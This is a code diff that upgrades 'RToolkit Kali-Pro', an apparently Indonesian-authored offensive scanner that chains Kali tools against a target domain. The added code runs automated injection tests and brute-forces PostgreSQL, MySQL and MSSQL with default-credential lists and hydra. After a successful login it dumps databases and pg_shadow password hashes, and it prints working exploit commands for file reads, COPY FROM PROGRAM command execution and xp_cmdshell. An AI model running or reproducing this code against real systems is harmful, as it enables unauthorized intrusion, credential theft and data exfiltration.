@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 """
-RToolkit Kali-Pro v1.0 — Deep Kali Linux Scanner
+RToolkit Kali-Pro v2.0 — Deep Kali Linux Scanner
 Mengintegrasikan tools Kali Linux untuk scanning dan enumeration mendalam:
 nuclei, dirsearch, ffuf, paramspider, whatweb, nmap, subfinder, httpx, sqlmap, nikto
++ Advanced Parameter Discovery: endpoints-extractor, Arjun, x8
 
 Output: Tabel hasil scanning + payload exploit untuk setiap kerentanan
 """
@@ -42,7 +43,7 @@ def banner():
 ║{W}  ██╔══██╗   ██║   ██║   ██║██║   ██║██╔═██╗ ██║     ██║   ██║   {R} ║
 ║{W}  ██║  ██║   ██║   ╚██████╔╝╚██████╔╝██║  ██╗███████╗██║   ██║   {R} ║
 ║{W}  ╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝   {R} ║
-║{Y}     Kali-Pro v1.0 — nuclei | dirsearch | ffuf | paramspider | nmap{R} ║
+║{Y}  Kali-Pro v2.0 — nuclei | dirsearch | ffuf | Arjun | x8 | endpoints{R} ║
 ╚══════════════════════════════════════════════════════════════╝{N}""")
 
 def check_tools():
@@ -51,14 +52,44 @@ def check_tools():
         "nuclei": False, "dirsearch": False, "ffuf": False, "whatweb": False,
         "nmap": False, "subfinder": False, "httpx": False, "nikto": False,
         "sqlmap": False, "paramspider": False, "gobuster": False, "wpscan": False,
+        "arjun": False, "x8": False, "endpoints_extractor": False,
     }
     print(f"\n  {c('[+] Checking Kali Tools', G)}")
-    for tool in tools:
+
+    # Standard tools via shutil.which
+    for tool in ["nuclei", "dirsearch", "ffuf", "whatweb", "nmap", "subfinder",
+                  "httpx", "nikto", "sqlmap", "paramspider", "gobuster", "wpscan",
+                  "arjun", "x8"]:
         path = shutil.which(tool)
         available = path is not None
         tools[tool] = available
         icon = c("✓", G) if available else c("✗", R)
         print(f"    {icon} {tool}")
+
+    # endpoints-extractor (Bash script, check by filename)
+    ep_found = False
+    ep_path_final = None
+    for ep_name in ["find_urls_endpoints.sh", "endpoints-extractor/find_urls_endpoints.sh"]:
+        if shutil.which(ep_name):
+            ep_found = True
+            ep_path_final = shutil.which(ep_name)
+            break
+        if Path(ep_name).exists():
+            ep_found = True
+            ep_path_final = str(Path(ep_name).resolve())
+            break
+    # Also check common locations
+    for ep_dir in ["/usr/local/bin", "/usr/bin", os.getcwd(), os.path.dirname(os.path.abspath(__file__))]:
+        candidate = Path(ep_dir) / "find_urls_endpoints.sh"
+        if candidate.exists():
+            ep_found = True
+            ep_path_final = str(candidate.resolve())
+            break
+    if ep_found and ep_path_final:
+        tools["endpoints_extractor"] = ep_path_final
+    icon = c("✓", G) if ep_found else c("✗", R)
+    print(f"    {icon} endpoints-extractor")
+
     return tools
 
 def run_cmd(cmd, timeout=120, desc=""):
@@ -337,6 +368,256 @@ def phase_parameters(domain, tools):
                     REPORT["parameters"].append(p)
         if found_params:
             print_table(["Parameter", "Finding"], found_params, "[POTENTIALLY VULNERABLE PARAMS]")
+
+
+# ============ PHASE 3b: ADVANCED PARAMETER DISCOVERY ============
+
+def phase_params_advanced(domain, tools):
+    """Run endpoints-extractor, Arjun, and x8 for deep hidden parameter discovery."""
+    print(f"\n{c('='*65, Y)}")
+    print(f"  {c('PHASE 3b: ADVANCED PARAMETER DISCOVERY', BOLD)}")
+    print(f"  {c('  endpoints-extractor + Arjun + x8', DIM)}")
+    print(f"{c('='*65, Y)}")
+
+    url = f"https://{domain}"
+    all_endpoints = []
+    x8_wordlist = "/usr/share/wordlists/dirb/common.txt"
+
+    # ---------- endpoints-extractor: Extract URLs/Endpoints from HTML/JS ----------
+    ep_tool = tools.get("endpoints_extractor")
+    if ep_tool:
+        print(f"\n  {c('[+] Endpoints-Extractor: URL/Endpoint Extraction', G)}")
+        ep_sh = ep_tool if isinstance(ep_tool, str) and Path(ep_tool).exists() else "find_urls_endpoints.sh"
+        stdout, stderr, ok = run_cmd(
+            f"bash {ep_sh} -u {url} -s {RESULTS_DIR}/endpoints.txt 2>/dev/null",
+            120, "extracting endpoints from HTML/JS/JSON"
+        )
+        ep_file = RESULTS_DIR / "endpoints.txt"
+        if ep_file.exists():
+            content = ep_file.read_text().strip()
+            endpoints = [l.strip() for l in content.split('\n') if l.strip()]
+            if endpoints:
+                ep_rows = []
+                for ep in endpoints[:30]:
+                    ep_rows.append([c(ep[:90], W)])
+                    all_endpoints.append(ep)
+                    # Extract params from endpoint URLs
+                    parsed = urlparse(ep)
+                    if parsed.query:
+                        for param in parsed.query.split('&'):
+                            pname = param.split('=')[0]
+                            if pname not in REPORT["parameters"]:
+                                REPORT["parameters"].append(pname)
+                print_table(["Endpoint URL"], ep_rows, f"[ENDPOINTS ({len(endpoints)} found, showing 30)]")
+
+    # ---------- Arjun: HTTP Parameter Discovery Suite ----------
+    if tools.get("arjun"):
+        print(f"\n  {c('[+] Arjun: HTTP Parameter Discovery', G)}")
+        print(f"    {c('Scanning with 25,890+ parameter wordlist...', DIM)}")
+
+        # Arjun on main URL
+        stdout, _, ok = run_cmd(
+            f"arjun -u {url} --get --passive -oJ -oT {RESULTS_DIR}/arjun.txt 2>/dev/null",
+            180, "arjun parameter discovery (GET + passive sources)"
+        )
+        arjun_file = RESULTS_DIR / "arjun.txt"
+        arjun_params = []
+        if arjun_file.exists():
+            content = arjun_file.read_text()
+            for line in content.split('\n'):
+                line = line.strip()
+                if line and '=' in line:
+                    pname = line.split('=')[0].strip()
+                    if pname and pname not in REPORT["parameters"]:
+                        REPORT["parameters"].append(pname)
+                        arjun_params.append([c(pname, G), c(f"{url}?{pname}=<value>", W)])
+        # Also try to parse JSON output
+        arjun_json = RESULTS_DIR / "arjun.json"
+        if arjun_json.exists():
+            try:
+                data = json.loads(arjun_json.read_text())
+                if isinstance(data, dict):
+                    for endpoint, params in data.items():
+                        if isinstance(params, list):
+                            for p in params:
+                                if p not in REPORT["parameters"]:
+                                    REPORT["parameters"].append(p)
+                                    arjun_params.append([c(p, G), c(f"{endpoint}?{p}=<value>", W)])
+            except: pass
+
+        if not arjun_params:
+            # Fallback: parse stdout
+            for line in stdout.split('\n'):
+                m = re.search(r'\[\+\] Found:\s*(\S+)', line)
+                if m:
+                    pname = m.group(1).strip()
+                    if pname and pname not in REPORT["parameters"]:
+                        REPORT["parameters"].append(pname)
+                        arjun_params.append([c(pname, G), c(f"{url}?{pname}=<value>", W)])
+
+        if arjun_params:
+            print_table(["Parameter", "Example URL"], arjun_params, f"[ARJUN PARAMS ({len(arjun_params)} found)]")
+        else:
+            print(f"    {c('No parameters discovered by Arjun', Y)}")
+
+        # Arjun on discovered endpoints (first 5)
+        if all_endpoints:
+            print(f"\n    {c('Scanning discovered endpoints with Arjun...', DIM)}")
+            for ep in all_endpoints[:5]:
+                stdout, _, _ = run_cmd(
+                    f"arjun -u {ep} --get -oJ 2>/dev/null",
+                    120, f"arjun on endpoint: {ep[:50]}..."
+                )
+                for line in stdout.split('\n'):
+                    m = re.search(r'\[\+\]\s*Found:\s*(\S+)', line)
+                    if m:
+                        pname = m.group(1).strip()
+                        if pname and pname not in REPORT["parameters"]:
+                            REPORT["parameters"].append(pname)
+                            print(f"    {c(f'  ✓ {pname} @ {ep}', G)}")
+
+    # ---------- x8: Hidden Parameter Fuzzer (Rust) ----------
+    if tools.get("x8"):
+        print(f"\n  {c('[+] x8: Hidden Parameter Fuzzer', G)}")
+        print(f"    {c('High-accuracy parameter discovery via page comparison...', DIM)}")
+
+        # Check if wordlist exists
+        x8_wl = x8_wordlist
+        if not Path(x8_wl).exists():
+            x8_wl = str(RESULTS_DIR / "params_wordlist.txt")
+            # Create a minimal wordlist if needed
+            if not Path(x8_wl).exists():
+                basic_params = ["id","page","q","s","search","cat","file","load","action",
+                               "do","exec","cmd","template","include","path","debug","test",
+                               "admin","config","token","key","secret","pass","user","email",
+                               "lang","ref","redirect","url","site","dir","folder","name",
+                               "type","view","show","edit","delete","create","update","get",
+                               "order","sort","limit","offset","start","end","date","time",
+                               "filter","query","search","term","keyword","input","output",
+                               "return","callback","format","method","mode","option","option",
+                               "pageNum","pageNumber","page_no","record","records","result",
+                               "results","per_page","items","data","value","values","enable",
+                               "disable","hide","visible","read","write","upload","download"]
+                RESULTS_DIR.mkdir(exist_ok=True)
+                with open(x8_wl, 'w') as f:
+                    f.write('\n'.join(basic_params))
+
+        # x8 on main URL
+        stdout, _, ok = run_cmd(
+            f"x8 -u '{url}' -w {x8_wl} --follow-redirects -O json -o {RESULTS_DIR}/x8_output.json 2>/dev/null",
+            180, "x8 hidden parameter fuzzing on main URL"
+        )
+
+        # Parse x8 JSON output
+        x8_params = []
+        x8_file = RESULTS_DIR / "x8_output.json"
+        if x8_file.exists():
+            try:
+                data = json.loads(x8_file.read_text())
+                if isinstance(data, list):
+                    for entry in data:
+                        param = entry.get("param", "")
+                        param_url = entry.get("url", url)
+                        param_method = entry.get("method", "GET")
+                        if param and param not in REPORT["parameters"]:
+                            REPORT["parameters"].append(param)
+                            x8_params.append([c(param, G), c(param_url[:70], W), c(param_method, DIM)])
+                elif isinstance(data, dict):
+                    for param, info in data.items():
+                        if param and param not in REPORT["parameters"]:
+                            REPORT["parameters"].append(param)
+                            ep_url = info.get("url", url) if isinstance(info, dict) else url
+                            x8_params.append([c(param, G), c(ep_url[:70], W), c("GET", DIM)])
+            except: pass
+
+        # Also try x8 on discovered endpoints
+        if all_endpoints:
+            ep_file_list = RESULTS_DIR / "x8_targets.txt"
+            with open(ep_file_list, 'w') as f:
+                for ep in all_endpoints[:10]:
+                    f.write(ep + '\n')
+            stdout2, _, _ = run_cmd(
+                f"x8 -u '{ep_file_list}' -w {x8_wl} --follow-redirects -O json 2>/dev/null",
+                180, "x8 on discovered endpoints"
+            )
+            for line in stdout2.split('\n'):
+                try:
+                    d = json.loads(line.strip())
+                    param = d.get("param", "")
+                    if param and param not in REPORT["parameters"]:
+                        REPORT["parameters"].append(param)
+                        x8_params.append([c(param, G), c(d.get("url", url)[:70], W), c("GET", DIM)])
+                except: pass
+
+        if x8_params:
+            print_table(["Parameter", "URL", "Method"], x8_params, f"[X8 PARAMS ({len(x8_params)} found)]")
+        else:
+            print(f"    {c('No hidden parameters discovered by x8', Y)}")
+
+        # Save combined parameter list
+        param_file = RESULTS_DIR / "all_parameters.txt"
+        with open(param_file, 'w') as f:
+            for p in sorted(set(REPORT["parameters"])):
+                f.write(f"{p}\n")
+        total_unique = len(set(REPORT["parameters"]))
+        print(f"    {c(f'Total unique params: {total_unique}', C)}")
+
+    # ---------- Auto-Feed: Test discovered params for injection ----------
+    if REPORT["parameters"]:
+        print(f"\n  {c('[+] Auto-Feed: Testing discovered parameters for injection', G)}")
+
+        # Build test URLs with discovered params
+        test_params = list(set(REPORT["parameters"]))[:15]  # Top 15 unique params
+
+        # 1. Test with nuclei using custom param fuzzing
+        if tools.get("nuclei"):
+            print(f"    {c('Feeding params to nuclei for injection testing...', DIM)}")
+            for p in test_params[:5]:
+                test_url = f"{url}?{p}=1"
+                stdout, _, _ = run_cmd(
+                    f"nuclei -u '{test_url}' -tags fuzz,injection -silent -json 2>/dev/null",
+                    120, f"nuclei testing param: {p}"
+                )
+                for line in stdout.split('\n'):
+                    try:
+                        d = json.loads(line.strip())
+                        if d:
+                            matched = d.get("matched-at", d.get("url", ""))
+                            name = d.get("info", {}).get("name", "Injection")
+                            sev = d.get("info", {}).get("severity", "medium").upper()
+                            REPORT["vulnerabilities"].append({
+                                "url": matched, "name": f"{name} (via {p})",
+                                "severity": sev,
+                                "detail": f"Parameter: {p}",
+                                "exploit_cmd": f"curl -s '{matched}'"
+                            })
+                    except: pass
+
+        # 2. Auto SQLMap on discovered params
+        if tools.get("sqlmap") and test_params:
+            sqli_params = [p for p in test_params if p.lower() in
+                          ["id","page","q","s","search","cat","file","load","action",
+                           "exec","cmd","order","sort","limit","offset","dir","query",
+                           "term","keyword","input","output","callback","record","items"]]
+            if sqli_params:
+                print(f"    {c('Auto-feeding params to SQLMap for SQLi testing...', DIM)}")
+                for p in sqli_params[:3]:
+                    stdout, _, ok = run_cmd(
+                        f"sqlmap -u '{url}?{p}=1' --batch --level 2 --risk 1 "
+                        f"--output-dir={RESULTS_DIR}/sqlmap_params 2>/dev/null",
+                        180, f"sqlmap on discovered param: {p}"
+                    )
+                    if stdout and ("vulnerable" in stdout.lower() or "identified" in stdout.lower()):
+                        for line in stdout.split('\n'):
+                            if "Parameter:" in line:
+                                REPORT["vulnerabilities"].append({
+                                    "url": f"{url}?{p}=1",
+                                    "name": f"SQL Injection via discovered param: {p}",
+                                    "severity": "CRITICAL",
+                                    "detail": line.strip(),
+                                    "exploit_cmd": f"sqlmap -u '{url}?{p}=1' --batch --dbs"
+                                })
+                                print(f"    {c(f'  ⚡ SQLi via discovered param: {p}!', R)}")
 
 
 # ============ PHASE 4: VULNERABILITY SCANNING ============
@@ -626,6 +907,274 @@ def generate_summary():
     print(f"\n  {c(f'📄 JSON Report: {json_file}', G)}")
 
 
+# ============ PHASE 4b: DATABASE EXPLOITATION ============
+
+PHASE4B_RAN = False
+
+def phase_db_scan(target, tools):
+    """Scan dan exploit database services (PostgreSQL, MySQL, MSSQL) yang terbuka."""
+    global PHASE4B_RAN
+    PHASE4B_RAN = True
+
+    print(f"\n{c('='*65, Y)}")
+    print(f"  {c('PHASE 4b: DATABASE EXPLOITATION', BOLD)}")
+    print(f"  {c('  PostgreSQL / MySQL / MSSQL — Default creds + Brute Force', DIM)}")
+    print(f"{c('='*65, Y)}")
+
+    domain = target.replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]
+    results = []
+
+    # Check which ports are open from nmap results
+    open_ports = REPORT.get("open_ports", [])
+    has_pgsql = any("5432" in p for p in open_ports)
+    has_mysql = any("3306" in p for p in open_ports)
+    has_mssql = any("1433" in p for p in open_ports)
+
+    # Also check manually via socket
+    import socket as socklib
+    for db_port, db_name in [(5432, "PostgreSQL"), (3306, "MySQL"), (1433, "MSSQL")]:
+        try:
+            s = socklib.socket()
+            s.settimeout(2)
+            s.connect((domain, db_port))
+            s.close()
+            if db_name == "PostgreSQL": has_pgsql = True
+            elif db_name == "MySQL": has_mysql = True
+            elif db_name == "MSSQL": has_mssql = True
+        except:
+            pass
+
+    # ---------- PostgreSQL ----------
+    if has_pgsql:
+        print(f"\n  {c('[!] PostgreSQL (port 5432) TERBUKA!', R)}")
+        print(f"  {c('  Target: postgresql://{domain}:5432', Y)}")
+        REPORT["vulnerabilities"].append({
+            "url": f"postgresql://{domain}:5432",
+            "name": "PostgreSQL Exposed to Public Internet",
+            "severity": "CRITICAL",
+            "detail": "Port 5432 terbuka untuk umum dengan user postgres superuser",
+            "exploit_cmd": f"psql -h {domain} -p 5432 -U postgres"
+        })
+
+        # Default credentials test
+        print(f"\n  {c('[+] Testing PostgreSQL Default Credentials', G)}")
+        pg_creds = [
+            ("postgres", "postgres"), ("postgres", "admin"), ("postgres", "root"),
+            ("postgres", "password"), ("postgres", "123456"), ("postgres", "postgresql"),
+            ("postgres", "admin123"), ("postgres", "P@ssw0rd"), ("postgres", ""),
+            ("admin", "admin"), ("admin", "postgres"), ("root", "root"),
+            ("root", "postgres"), ("postgres", "changeme"), ("postgres", "pass"),
+        ]
+
+        found_creds = None
+        for user, pwd in pg_creds:
+            try:
+                stdout, stderr, ok = run_cmd(
+                    f"PGPASSWORD='{pwd}' psql -h {domain} -p 5432 -U {user} -c 'SELECT 1' -t 2>/dev/null",
+                    10, ""
+                )
+                if ok or "Welcome to psql" in stdout or "SELECT 1" in stdout.replace('\n','').strip():
+                    found_creds = (user, pwd)
+                    print(f"    {c(f'✓ LOGIN BERHASIL: {user}:{pwd}', G)}")
+                    break
+                # Check for specific PostgreSQL auth errors
+                if "password authentication failed" in stderr.lower():
+                    continue
+                if "no password" in stderr.lower():
+                    continue
+            except: pass
+
+        # Try with hydra if available for more thorough testing
+        if tools.get("hydra"):
+            print(f"\n  {c('[+] Hydra PostgreSQL Brute Force', G)}")
+            wordlist = "/usr/share/wordlists/rockyou.txt"
+            if not Path(wordlist).exists():
+                wordlist = "/usr/share/wordlists/fasttrack.txt"
+            if Path(wordlist).exists():
+                stdout, _, _ = run_cmd(
+                    f"hydra -l postgres -P {wordlist} {domain} -s 5432 postgres -t 4 -o {RESULTS_DIR}/hydra_pg.txt 2>/dev/null",
+                    120, "hydra brute forcing postgres password"
+                )
+                if stdout:
+                    for line in stdout.split('\n'):
+                        if "password:" in line.lower() or "login:" in line.lower():
+                            m = re.search(r'password:\s*(\S+)', line)
+                            if m:
+                                found_creds = ("postgres", m.group(1))
+                                print(f"    {c(f'✓ HYDRA FOUND: postgres:{m.group(1)}', G)}")
+
+        if found_creds:
+            user, pwd = found_creds
+            print(f"\n  {c('╔═══════════════════════════════════════╗', G)}")
+            print(f"  {c('║', G)}  {c('✅ POSTGRESQL ACCESS GRANTED!', BOLD)}      {c('║', G)}")
+            print(f"  {c('║', G)}  {c(f'Host: {domain}:5432', W)}          {c('║', G)}")
+            print(f"  {c('║', G)}  {c(f'User: {user}', W)}                   {c('║', G)}")
+            print(f"  {c('║', G)}  {c(f'Pass: {pwd}', W)}                   {c('║', G)}")
+            print(f"  {c('╚═══════════════════════════════════════╝', G)}")
+
+            REPORT["vulnerabilities"].append({
+                "url": f"postgresql://{domain}:5432",
+                "name": f"PostgreSQL Default/Weak Credentials: {user}:{pwd}",
+                "severity": "CRITICAL",
+                "detail": f"Login berhasil dengan credential {user}:{pwd}",
+                "exploit_cmd": f"PGPASSWORD='{pwd}' psql -h {domain} -p 5432 -U {user} -d postgres"
+            })
+
+            # Auto-exploit: dump database info
+            print(f"\n  {c('[+] Auto-Enumerating PostgreSQL...', G)}")
+            cmds = [
+                ("Databases", "SELECT datname FROM pg_database WHERE datistemplate=false;"),
+                ("Users", "SELECT usename, passwd FROM pg_shadow;"),
+                ("Tables (postgres)", "SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema') LIMIT 20;"),
+                ("Current User", "SELECT current_user, inet_server_addr(), inet_server_port();"),
+                ("Version", "SELECT version();"),
+                ("Superuser", "SELECT usename FROM pg_user WHERE usesuper=true;"),
+                ("PGP Keys", "SELECT * FROM pg_user WHERE usename='postgres';"),
+            ]
+            for label, sql in cmds:
+                stdout, _, ok = run_cmd(
+                    f"PGPASSWORD='{pwd}' psql -h {domain} -p 5432 -U {user} -d postgres -c \"{sql}\" 2>/dev/null",
+                    15, f"executing: {label}"
+                )
+                if stdout:
+                    lines = [l for l in stdout.split('\n') if l.strip() and 'rows' not in l.lower() and '---' not in l]
+                    if lines:
+                        print(f"\n    {c(f'[{label}]', C)}")
+                        for line in lines[:8]:
+                            print(f"    {line.strip()}")
+                        if len(lines) > 8:
+                            print(f"    {c('... (truncated)', DIM)}")
+        else:
+            print(f"\n  {c('  ✗ Default credentials failed. Try manual brute force:', Y)}")
+            print(f"    {c(f'hydra -l postgres -P /usr/share/wordlists/rockyou.txt {domain} -s 5432 postgres -t 4', DIM)}")
+            print(f"    {c(f'metasploit: use auxiliary/scanner/postgres/postgres_login', DIM)}")
+
+        # PostgreSQL exploitation commands regardless
+        print(f"\n  {c('[⚡] PostgreSQL Exploit Commands:', R)}")
+        exploits = [
+            f"# 1. Brute force with hydra",
+            f"hydra -l postgres -P /usr/share/wordlists/rockyou.txt {domain} -s 5432 postgres -t 4",
+            f"",
+            f"# 2. Metasploit scanner",
+            f"msfconsole -q -x 'use auxiliary/scanner/postgres/postgres_login; set RHOSTS {domain}; set STOP_ON_SUCCESS true; run'",
+            f"",
+            f"# 3. Connect jika dapat password",
+            f"PGPASSWORD='PASSWORD' psql -h {domain} -p 5432 -U postgres -d postgres",
+            f"",
+            f"# 4. Dump all databases",
+            f"PGPASSWORD='PASSWORD' pg_dumpall -h {domain} -p 5432 -U postgres > dump.sql",
+            f"",
+            f"# 5. File read (superuser)",
+            f"PGPASSWORD='PASSWORD' psql -h {domain} -p 5432 -U postgres -c \"COPY (SELECT pg_read_file('/etc/passwd')) TO STDOUT;\"",
+            f"",
+            f"# 6. Command execution (CVE-2019-9193)",
+            f"PGPASSWORD='PASSWORD' psql -h {domain} -p 5432 -U postgres -c 'DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM \\\"id\\\"; SELECT * FROM cmd_exec;'",
+            f"",
+            f"# 7. Metasploit postgres exploitation",
+            f"msfconsole -q -x 'use auxiliary/admin/postgres/postgres_sql; set RHOSTS {domain}; set PASSWORD PASSWORD; set DATABASE postgres; run'",
+        ]
+        for line in exploits:
+            print(f"    {c(line, DIM)}")
+
+    # ---------- MySQL ----------
+    if has_mysql:
+        print(f"\n  {c('[!] MySQL (port 3306) TERBUKA!', R)}")
+        REPORT["vulnerabilities"].append({
+            "url": f"mysql://{domain}:3306",
+            "name": "MySQL Exposed to Public Internet",
+            "severity": "CRITICAL",
+            "detail": "Port 3306 terbuka untuk umum",
+            "exploit_cmd": f"mysql -h {domain} -u root -p"
+        })
+
+        print(f"\n  {c('[+] Testing MySQL Default Credentials', G)}")
+        mysql_creds = [
+            ("root", ""), ("root", "root"), ("root", "admin"), ("root", "password"),
+            ("root", "123456"), ("root", "P@ssw0rd"), ("root", "mysql"),
+            ("admin", "admin"), ("admin", "password"),
+        ]
+        mysql_found = None
+        for user, pwd in mysql_creds:
+            try:
+                stdout, stderr, ok = run_cmd(
+                    f"mysql -h {domain} -u {user} -p'{pwd}' -e 'SELECT 1' -s 2>/dev/null",
+                    10, ""
+                )
+                if ok or "1" in stdout.strip():
+                    mysql_found = (user, pwd)
+                    print(f"    {c(f'✓ LOGIN BERHASIL: {user}:{pwd}', G)}")
+                    break
+            except: pass
+
+        if mysql_found:
+            user, pwd = mysql_found
+            print(f"\n  {c('╔═══════════════════════════════════════╗', G)}")
+            print(f"  {c('║', G)}  {c('✅ MYSQL ACCESS GRANTED!', BOLD)}            {c('║', G)}")
+            print(f"  {c('║', G)}  {c(f'Host: {domain}:3306', W)}           {c('║', G)}")
+            print(f"  {c('║', G)}  {c(f'User: {user}', W)}                    {c('║', G)}")
+            print(f"  {c('╚═══════════════════════════════════════╝', G)}")
+
+            REPORT["vulnerabilities"].append({
+                "url": f"mysql://{domain}:3306",
+                "name": f"MySQL Default Credentials: {user}:{pwd}",
+                "severity": "CRITICAL",
+                "detail": f"Login berhasil dengan credential {user}:{pwd}",
+                "exploit_cmd": f"mysql -h {domain} -u {user} -p'{pwd}'"
+            })
+
+        print(f"\n  {c('[⚡] MySQL Exploit Commands:', R)}")
+        mysql_exploits = [
+            f"# 1. Brute force with hydra",
+            f"hydra -l root -P /usr/share/wordlists/rockyou.txt {domain} -s 3306 mysql",
+            f"",
+            f"# 2. Connect (root:empty password)",
+            f"mysql -h {domain} -u root",
+            f"",
+            f"# 3. Dump all databases",
+            f"mysql -h {domain} -u root -p'PASSWORD' -e 'SELECT schema_name FROM information_schema.schemata;'",
+            f"",
+            f"# 4. File read (if secure_file_priv enabled)",
+            f"mysql -h {domain} -u root -p'PASSWORD' -e \"SELECT LOAD_FILE('/etc/passwd');\"",
+            f"",
+            f"# 5. Metasploit scanner",
+            f"msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_login; set RHOSTS {domain}; set STOP_ON_SUCCESS true; run'",
+        ]
+        for line in mysql_exploits:
+            print(f"    {c(line, DIM)}")
+
+    # ---------- MSSQL ----------
+    if has_mssql:
+        print(f"\n  {c('[!] MSSQL (port 1433) TERBUKA!', R)}")
+        REPORT["vulnerabilities"].append({
+            "url": f"mssql://{domain}:1433",
+            "name": "MSSQL Exposed to Public Internet",
+            "severity": "CRITICAL",
+            "detail": "Port 1433 terbuka untuk umum",
+            "exploit_cmd": f"sqsh -S {domain} -U sa -P password"
+        })
+        print(f"\n  {c('[⚡] MSSQL Exploit Commands:', R)}")
+        mssql_exploits = [
+            f"# 1. Brute force with hydra",
+            f"hydra -l sa -P /usr/share/wordlists/rockyou.txt {domain} -s 1433 mssql",
+            f"",
+            f"# 2. Connect with sqsh",
+            f"sqsh -S {domain} -U sa -P 'PASSWORD'",
+            f"",
+            f"# 3. Metasploit scanner",
+            f"msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_login; set RHOSTS {domain}; run'",
+            f"",
+            f"# 4. xp_cmdshell (RCE jika sa)",
+            f"msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {domain}; set CMD whoami; run'",
+        ]
+        for line in mssql_exploits:
+            print(f"    {c(line, DIM)}")
+
+    if not (has_pgsql or has_mysql or has_mssql):
+        print(f"\n  {c('  ✓ No public database services detected', G)}")
+
+    return results
+
+
 # ============ MAIN ============
 
 def main():
@@ -647,7 +1196,9 @@ def main():
     tools = phase_recon(domain)
     phase_directories(domain, tools)
     phase_parameters(domain, tools)
+    phase_params_advanced(domain, tools)
     phase_vuln_scan(domain, tools)
+    phase_db_scan(domain, tools)
     generate_summary()
 
     print(f"\n  {c('✅ Scan complete!', G)}")
